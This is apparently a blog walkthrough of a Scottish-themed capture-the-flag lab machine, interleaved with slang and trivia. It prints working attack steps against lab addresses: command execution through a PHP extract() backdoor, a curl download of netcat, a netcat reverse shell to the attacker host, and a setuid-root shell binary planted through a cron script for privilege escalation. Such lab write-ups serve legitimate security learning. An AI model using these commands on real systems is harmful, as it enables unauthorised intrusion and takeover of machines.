<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;title&gt;Dirty Foties&lt;/title&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;h1&gt;We went on a wee sojourn aboot North Kilt Town and here's whit we saw&lt;/h1&gt;
</span><span class='line'>&lt;!-- By now, people will be going doolally. Images will open doors once ye --&gt;
</span><span class='line'>&lt;!-- pick up on the nuances whar's ma glass cheque! --&gt;
</span><span class='line'>&lt;b&gt;&lt;/b&gt;
</span><span class='line'>Here's something else made from Girders:
</span><span class='line'>
</span><span class='line'>&lt;img src="bandit_country.jpg" alt="Andrew Carnegie" height="460" width="968"&gt;
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>
</span><span class='line'>&lt;!-- Beware of the milk snatcher --&gt;
</span><span class='line'>&lt;b&gt;&lt;/b&gt;
</span><span class='line'>Here's where the girders used to come from:
</span><span class='line'>&lt;img src="milk_snatcher.jpg" alt="Margaret Roberts" height="409" width="615" align="centre"&gt;
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>
</span><span class='line'>&lt;b&gt;&lt;/b&gt;
</span><span class='line'>Wee hoose on the corner:
</span><span class='line'>&lt;img src="embra.jpg" alt="Castle" height="409" width="615" align="centre"&gt;
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>
</span><span class='line'>&lt;!-- The video gives triggers to the gallery --&gt;
</span><span class='line'>
</span><span class='line'>&lt;!-- Definatly need to find that coded message --&gt;
</span><span class='line'>&lt;b&gt;&lt;/b&gt;
</span><span class='line'>&lt;img src="bigwheel.jpg" alt="Rotating Station" height="460" width="968" align="centre"&gt;
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>
</span><span class='line'>&lt;b&gt;&lt;/b&gt;
</span><span class='line'>Then we bumped into Mr Corleone:
</span><span class='line'>&lt;img src="horse_heid.jpg" alt="Kelpies" height="409" width="615" align="centre"&gt;</span></code></pre></td></tr></table></div></figure>


<p>North Kilttown is a Scottish town from The Simpsons. Ah searched for the word doolally, even though Ah got the gist from the context. From Wikipedia:</p>

<blockquote><p>&ldquo;Doolally&rdquo;, originally &ldquo;doolally tap&rdquo;, meaning to &lsquo;lose one′s mind&rsquo;, derived from the boredom felt
at the Deolali British Army transit camp.</p></blockquote>

<p>The Urban Dictionary has another priceless definition for a glass cheque:</p>

<blockquote><p>A Glaswegian term: Describes a special glass bottle, containing Irn-Bru, or other similar soft
drink, available in many cornershops in Scotland. The bottle is returnable and currently attracts a
25p refund when ye give the bottle back to the shop. Called a cheque as they are often collected
and cashed (like a cheque)by students and cheap bastards alike either to buy more Bru, or with
enough bottles, some skag.</p></blockquote>

<p>If ye&rsquo;re not curious about what something called Irn-Bru is, ye&rsquo;re a bawheid!</p>

<blockquote><p>The ultimate hangover cure. Tastes best when consumed directly from a 750ml glass bottle.</p>

<p>Another one of Scotland&rsquo;s many national identities.</p>

<p>Scotland is the only country in the world that produces a soft drink that outsells Coca Cola.</p></blockquote>

<p>Ah must try some Irn-Bru! By the way, if ye were wondering, the &ldquo;Wee hoose on the corner&rdquo; is nothing spectacular&hellip;only the Edinburgh Castle! The Kelpies are 30-metre-high horse-head sculptures featuring kelpies&hellip;so what are kelpies? +1 to mythology skill:</p>

<blockquote><p>Kelpie, or water kelpie, is the Scots name given to a shape-shifting water spirit inhabiting the
lochs and pools of Scotland. It has usually been described as appearing as a horse, but is able to
adopt human form</p></blockquote>

<p>How did Ah get in this spiral? Ah had a box to hack..ye know what would help me focus? It starts with Irn and ends with Bru!</p>

<p>The /flicks/ directory gives a 403 Forbidden error, but also discloses the web server version, which is Apache/2.4.18 (Ubuntu) Server</p>

<p>The /telly/ directory also has a picture and 2 videos, along with more hints:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;title&gt;STV Embra&lt;/title&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;h1&gt;Here's some telly programs fur ye!&lt;/h1&gt;
</span><span class='line'>&lt;!-- Mind the hidden messages --&gt;
</span><span class='line'>&lt;b&gt;&lt;/b&gt;
</span><span class='line'>&lt;img src="STV.jpg" alt="STV" height=300" width="400"&gt;
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>
</span><span class='line'>Now for some adverts....
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>&lt;!-- noise up those crazy yanks 1st hint to a password --&gt;
</span><span class='line'>&lt;video height="300" width="400" controls&gt;
</span><span class='line'>&lt;source src="girders.ogv" type="video/ogg"&gt;
</span><span class='line'>&lt;/video&gt;
</span><span class='line'>&lt;!-- next hint, see how many people make the connection  --&gt;
</span><span class='line'>&lt;!-- between A.G. Barr and the gallery... Aled Jones eh? --&gt;
</span><span class='line'>&lt;video height="300" width="400" controls&gt;
</span><span class='line'>&lt;source src="aled.ogv" type="video/ogg"&gt;
</span><span class='line'>&lt;/video&gt;
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;!-- Third video gives triggers to the flicks phpinfo --&gt;
</span><span class='line'>By the way, it's only aboot 250 weeks ti Christmas!
</span><span class='line'>&lt;br&gt;&lt;/br&gt;</span></code></pre></td></tr></table></div></figure>


<p>In case ye forgot about Irn-Bru, here&rsquo;s a reminder:</p>

<blockquote><p>A.G. BARR p.l.c., commonly known as Barr&rsquo;s, is a Scottish soft drink manufacturer, based in
Cumbernauld, Scotland. It manufactures the popular Scottish drink, Irn-Bru</p></blockquote>

<p>Back to the challenge&hellip;but it would be easier if Ah had some Irn-Bru! At this point, the only actionable hint Ah could understand was the one about phpinfo. There is no third video on the page, so Ah just tried navigating to <a href="http://192.168.145.131/flicks/phpinfo.php,">http://192.168.145.131/flicks/phpinfo.php,</a> which didn&rsquo;t work. Following on the hint about .pht extensions, Ah changed it to <a href="http://192.168.145.131/flicks/phpinfo.pht">http://192.168.145.131/flicks/phpinfo.pht</a> and got a blank page instead.</p>

<p>After some Googling and drooling over Irn-Bru, Ah found a blog post about <a href="https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html">PHP Backdoors: Hidden With Clever Use of Extract Function</a>. It explains about a seemingly innocuous backdoor with the code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>@extract ($_REQUEST); 
</span><span class='line'>@die ($ctime($atime));</span></code></pre></td></tr></table></div></figure>


<blockquote><p>The extract() function imports variables into the local symbol table from an array.</p>

<p>This function uses array keys as variable names and values as variable values. For each element it
will create a variable in the current symbol table.</p></blockquote>

<p>The blog post is a very interesting read, and the applicable item is that the code is extracting content sent via GET/POST requests and creating variables that are then executed with the format <code>execute ctime with atime as argument</code></p>

<p>Following the example, running <a href="http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=whoami">http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=whoami</a> returns www-data, so we have achieved command execution! Time for an Irn-Bru break&hellip;</p>

<p>Doing very light enumeration, Ah found out that netcat is available on the target, so Ah fired up a listener and tried using netcat to serve a shell on my listener, but it didn&rsquo;t work. So Ah used Python&rsquo;s SimpleHTTPServer to transfer my netcat to the target system. Note that ye have to use URL encoding: <code><a href="http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=curl%20http%3A%2F%2F192.168.145.129%2Fnc%20--output%20nc">http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=curl%20http%3A%2F%2F192.168.145.129%2Fnc%20--output%20nc</a></code></p>

<p>The binary was downloaded to <code>/var/www/html/flicks</code>. Ah made it executable and ran it, but nothing happened. Next, Ah moved it to /tmp and ran it from there with <code>192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=%2Ftmp%2Fnc%20192.168.145.129%208080%20-e%20%2Fbin%2Fbash</code> and it worked:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8080
</span><span class='line'>listening on [any] 8080 ...
</span><span class='line'>connect to [192.168.145.129] from (UNKNOWN) [192.168.145.131] 49172
</span><span class='line'>whoami
</span><span class='line'>www-data</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>We have a reverse shell, but it&rsquo;s very limited. The usual Python shell spawning didn&rsquo;t work, because on the box there&rsquo;s actually Python 3. Which only changes things slightly: <code>python3 -c &ldquo;import pty; pty.spawn(&lsquo;/bin/bash&rsquo;);&rdquo;</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python3 -c "import pty; pty.spawn('/bin/bash');"
</span><span class='line'>www-data@teuchter:/var/www/html/flicks$ ls /home
</span><span class='line'>ls /home
</span><span class='line'>cpgrogan  jkerr  proclaimers</span></code></pre></td></tr></table></div></figure>


<p>Inside cpgrogan there&rsquo;s a kochanski directory that we&rsquo;re not permitted to view. In jkerr&rsquo;s home there&rsquo;s an empty .sudo_as_admin_successful file, but we find a hint about jkerr&rsquo;s password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@teuchter:/home/jkerr$ cat login.txt
</span><span class='line'>cat login.txt
</span><span class='line'>Jim,
</span><span class='line'>
</span><span class='line'>Ah decided to rename yer account to jkerr and reset the password
</span><span class='line'>ye'll find it in the photo. Just remember the decode password
</span><span class='line'>dosn't have a space.
</span><span class='line'>
</span><span class='line'>If ye can't figure it out, it's the new name for Jonny & the
</span><span class='line'>Self-Abusers...</span></code></pre></td></tr></table></div></figure>


<p>And inside proclaimers there are 2 directories. We can&rsquo;t enter 500miles, but inside letterfromamerica there are 2 interesting files belonging to root:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@teuchter:/home/proclaimers/letterfromamerica$ ls -alh
</span><span class='line'>ls -alh
</span><span class='line'>total 164K
</span><span class='line'>drwxr-xr-x 2 proclaimers proclaimers 4.0K Aug 11  2016 .
</span><span class='line'>drwxr-xr-x 5 proclaimers proclaimers 4.0K Sep 23  2016 ..
</span><span class='line'>-rwsr-xr-x 1 root        root        151K Aug 11  2016 semaphore
</span><span class='line'>-r-Sr-sr-t 1 root        root          42 Jul  9  2016 test</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>Inside test there is some kind of message, stating that &ldquo;So Claire was right about those wildcards&rdquo;, and semaphore is an executable. Running it gives a shell under the same user account. Probably need more information (or Irn-Bru) before exploiting this.</p>

<p>Back to the next step, did a su to jkerr and used <em>breakfastclub</em> as a password and it worked! Ah used Python to transfer the images to my machine and broke my shell in the process:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>jkerr@teuchter:~$ python3 -m http.server 8080
</span><span class='line'>python3 -m http.server 8080
</span><span class='line'>Serving HTTP on 0.0.0.0 port 8080 ...
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:23] "GET / HTTP/1.1" 200 -
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:23] code 404, message File not found
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:23] "GET /robots.txt HTTP/1.1" 404 -
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:24] code 404, message File not found
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:24] "GET /favicon.ico HTTP/1.1" 404 -
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:24] code 404, message File not found
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:24] "GET /favicon.ico HTTP/1.1" 404 -
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:27] "GET /promisedyeamiracle.jpg HTTP/1.1" 200 -
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:29] "GET /breakfastclub.jpg HTTP/1.1" 200 -</span></code></pre></td></tr></table></div></figure>


<p>An Irn-Bru would have prevented that mistake! After redoing the steps, Ah ran exiftool on the downloaded images and found a base64 encoded string in promisedyeamiracle.jpg:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Copyright                       : Z2VtaW5pCg==</span></code></pre></td></tr></table></div></figure>


<p>Decoded, it means <em>gemini</em>. Ah didn&rsquo;t know what to do with this, so Ah googled for the other user accounts.</p>

<p>cpgrogan:</p>

<blockquote><p>Claire Patricia Grogan (born 17 March 1962), known professionally as Clare Grogan or sometimes as
C. P. Grogan, is a Scottish actress and singer. She is best known as the lead singer of the 1980s
new wave music group Altered Images and for supporting roles in the 1981 film Gregory&rsquo;s Girl and
the science fiction sitcom Red Dwarf as the first incarnation of Kristine Kochansk</p></blockquote>

<p>proclaimers:</p>

<blockquote><p>The Proclaimers are a Scottish music duo composed of twin brothers Charlie and Craig Reid (born 5
March 1962). They are best known for their songs &ldquo;I&rsquo;m Gonna Be (500 Miles)&rdquo;, &ldquo;Sunshine on Leith&rdquo;,
&ldquo;I&rsquo;m On My Way&rdquo; and &ldquo;Letter from America&rdquo;, and their singing style with a Scottish accent</p></blockquote>

<p>Well, we don&rsquo;t need an Irn-Bru to connect the dots, gemini, twins! That is actually the password for the proclaimers account. Now to get back to the folders from before:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>proclaimers@teuchter:~/500miles$ ls -alh
</span><span class='line'>ls -alh
</span><span class='line'>total 228K
</span><span class='line'>drwx------ 2 proclaimers proclaimers 4.0K Jul  9  2016 .
</span><span class='line'>drwxr-xr-x 5 proclaimers proclaimers 4.0K Sep 23  2016 ..
</span><span class='line'>-rw-rw---- 1 proclaimers proclaimers 8.0K Jun 30  2016 choclate_lassie.jpg
</span><span class='line'>-rw-rw---- 1 proclaimers proclaimers  97K Jun 30  2016 city_discovery.jpg
</span><span class='line'>-rw-rw---- 1 proclaimers proclaimers 8.5K Jun 30  2016 night_oot_teuchters.jpg
</span><span class='line'>-rw-rw---- 1 proclaimers proclaimers  87K Jun 30  2016 Restless-Natives-Scotland.jpg
</span><span class='line'>-rw-rw---- 1 proclaimers proclaimers  11K Jun 30  2016 SPT_red.jpg</span></code></pre></td></tr></table></div></figure>


<p>Ah downloaded the images in case of need and out of curiosity. Then it was back to the semaphore. Ah grepped for files containing the word semaphore, and tried avoiding being flooded by irrelevant results like libraries. Eventually, Ah got a hit under <em>/usr/local</em>, in the <code>/usr/local/bin/numpties.sh</code> file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#!/bin/sh
</span><span class='line'>
</span><span class='line'>## Right, time to sort out these numpties that put PHP shells on ma server!
</span><span class='line'>
</span><span class='line'>## Steal a copy to examine later
</span><span class='line'>/bin/tar czvf /root/shells.tgz /var/www/html/*.php
</span><span class='line'>
</span><span class='line'>## Aww they dobbers with primative Egpytian Encryption can away and raffle themselves
</span><span class='line'>sudo apt-get -y purge openssh-server sftp wget 
</span><span class='line'>
</span><span class='line'>## Delete the shells to annoy the eejits
</span><span class='line'>/bin/rm -rf /var/www/html/*.php
</span><span class='line'>
</span><span class='line'>## Plant a semaphore in to alert the monitoring system
</span><span class='line'>if /usr/bin/[ -f /home/proclaimers/letterfromamerica/semaphore ]
</span><span class='line'>  then
</span><span class='line'>    /bin/chown root.root /home/proclaimers/letterfromamerica/semaphore
</span><span class='line'>    /bin/chmod 4755 /home/proclaimers/letterfromamerica/semaphore
</span><span class='line'>fi</span></code></pre></td></tr></table></div></figure>


<p>Back to the dictionaries it is, and memory alert, Ah remembered being called a numpty once!</p>

<blockquote><p>numpty &ndash; A person who is incapable of performing the simplest of task correctly. Usual symptoms
include poor hand-eye coordination, zero common sense and the general illusion that they are
special (caused by parents referring to them as such and the numpty not fully grasping the meaning
implied).</p>

<p>Common causes are being dropped as a baby or repeated heavy blows to head in later life.</p>

<p>dobber &ndash; A Glasgow term for a dick head or in general just a stupid cunt.</p></blockquote>

<p>Now for the code, attempts to put PHP shells on the server fail because the shells get deleted. Also, a couple of file transfer utilities have been removed (the reason why Ah resorted to curl). It looks like this might be used in a cronjob. Finally, if the semaphore file exists, its owner is changed to root and the SUID bit is set. Which means, we can create a semaphore file that would allow us to become root if it were SUID.</p>

<p>On my box, Ah compiled an executable (no GCC on the target) with the following C code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;sys/types.h&gt;
</span><span class='line'>#include &lt;unistd.h&gt;
</span><span class='line'>int main(void)
</span><span class='line'>{
</span><span class='line'>  setuid(0); setgid(0); system("/bin/bash");
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Ah made it executable for everyone and transfered it to the target, again with curl:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>curl http://192.168.145.129/rootme --output ./semaphore     
</span><span class='line'>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span><span class='line'>                                 Dload  Upload   Total   Spent    Left  Speed
</span><span class='line'>100 16712  100 16712    0     0  1002k      0 --:--:-- --:--:-- --:--:-- 1020k</span></code></pre></td></tr></table></div></figure>


<p>Waited a while, thought about some Irn-Bru, came back and got root!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./semaphore
</span><span class='line'>root@teuchter:~/letterfromamerica#</span></code></pre></td></tr></table></div></figure>


<p>Finding the flag is usually the last step, but not on knightmare&rsquo;s machines!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>oot@teuchter:/root# ls -alh
</span><span class='line'>ls -alh
</span><span class='line'>total 1.1M
</span><span class='line'>drwx------  5 root root 4.0K Nov  2  2016 .
</span><span class='line'>drwxr-xr-x 23 root root 4.0K Nov  2  2016 ..
</span><span class='line'>drwx------  2 root root 4.0K Nov  2  2016 .aptitude
</span><span class='line'>-rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
</span><span class='line'>drwx------  2 root root 4.0K Nov  2  2016 .cache
</span><span class='line'>-rw-r--r--  1 root root 1.1M Jul  9  2016 flag.jpg
</span><span class='line'>-rw-r--r--  1 root root  108 Sep 23  2016 flag.txt
</span><span class='line'>-rw-r--r--  1 root root  148 Aug 17  2015 .profile
</span><span class='line'>drwx------  3 root root 4.0K Aug  1  2016 re-record-not-fade-away
</span><span class='line'>-rw-r--r--  1 root root   75 Jul  9  2016 .selected_editor
</span><span class='line'>-rw-r--r--  1 root root   45 Oct 13 20:00 shells.tgz
</span><span class='line'>-rw-------  1 root root 3.4K Nov  2  2016 .viminfo</span></code></pre></td></tr></table></div></figure>


<p>Ah transfered the flag.jpg to my machine with netcat, but no metadata that could help. The text file is not the right one, obviously:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@teuchter:/root# cat flag.txt 
</span><span class='line'>cat flag.txt
</span><span class='line'>Ah say! Ah say! Ah say boy! Y'all interested in hochmagandy again...?
</span><span class='line'>
</span><span class='line'>Y'all know this aint the correct flag! </span></code></pre></td></tr></table></div></figure>


<p>Looking around further:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@teuchter:/root/re-record-not-fade-away# ls 
</span><span class='line'>ls 
</span><span class='line'>FeelsLikeHeaven  on
</span><span class='line'>cat FeelsLikeHeaven
</span><span class='line'>Yer pure no gonna find the flag... A pit it in a bottle of Red Kola</span></code></pre></td></tr></table></div></figure>


<p>The directory tree goes&hellip;on..and on&hellip;Ah used a Python script to solve this annoyance:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'>
</span><span class='line'><span class="n">startdir</span> <span class="o">=</span> <span class="s">&#39;.&#39;</span>
</span><span class='line'><span class="k">for</span> <span class="nb">dir</span><span class="p">,</span> <span class="n">subdir</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="n">startdir</span><span class="p">):</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="s">&#39;Found directory: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">dir</span><span class="p">)</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\t</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">f</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@teuchter:/root/re-record-not-fade-away# python3 dir.py
</span><span class='line'>python3 dir.py
</span><span class='line'>Found directory: .
</span><span class='line'>  FeelsLikeHeaven
</span><span class='line'>  dir.py
</span><span class='line'>Found directory: ./on
</span><span class='line'>Found directory: ./on/and
</span><span class='line'>Found directory: ./on/and/on
</span><span class='line'>Found directory: ./on/and/on/and
</span><span class='line'>Found directory: ./on/and/on/and/on
</span><span class='line'>Found directory: ./on/and/on/and/on/and
</span><span class='line'>Found directory: ./on/and/on/and/on/and/on
</span><span class='line'>Found directory: ./on/and/on/and/on/and/on/and
</span><span class='line'>Found directory: ./on/and/on/and/on/and/on/and/on
</span><span class='line'>Found directory: ./on/and/on/and/on/and/on/and/on/and
</span><span class='line'>Found directory: ./on/and/on/and/on/and/on/and/on/and/ariston
</span><span class='line'>  TeuchterESX.zip</span></code></pre></td></tr></table></div></figure>


<p>Inside this madness there&rsquo;s a 12M archive. Ah moved it to a sane location, transfered it to my machine, and attempted to extract it, but it was password protected. No need for cracking, guessing from all the options, the password is <em>Teuchter</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>unzip TeuchterESX.zip 
</span><span class='line'>Archive:  TeuchterESX.zip
</span><span class='line'>[TeuchterESX.zip] TeuchterESX.vmdk password: 
</span><span class='line'>  inflating: TeuchterESX.vmdk        </span></code></pre></td></tr></table></div></figure>


<p>A VMDK disk. There&rsquo;s actually a hint for this inside root&rsquo;s crontab entries:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>## So vmfs-tools package eh....?
</span><span class='line'>*/5 * * * * /bin/sh /usr/local/bin/numpties.sh &gt; /dev/null 2&gt;&1</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what the package does:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>apt-cache show vmfs-tools
</span><span class='line'>Package: vmfs-tools
</span><span class='line'>Source: vmfs-tools (0.2.5-1)
</span><span class='line'>Version: 0.2.5-1+b2
</span><span class='line'>Installed-Size: 256
</span><span class='line'>Maintainer: Mike Hommey &lt;glandium@debian.org&gt;
</span><span class='line'>Architecture: amd64
</span><span class='line'>Depends: libc6 (&gt;= 2.14), libfuse2 (&gt;= 2.6), libuuid1 (&gt;= 2.16)
</span><span class='line'>Size: 53964
</span><span class='line'>SHA256: 39379758d08827726308ea6ccf76de0cc403ba94d1bcdec9127a120bbf4b050a
</span><span class='line'>SHA1: 7db639825b49cabb9d9081dd22ca94813cf335b6
</span><span class='line'>MD5sum: ee9aa037a69d28f6db694632d0f7a106
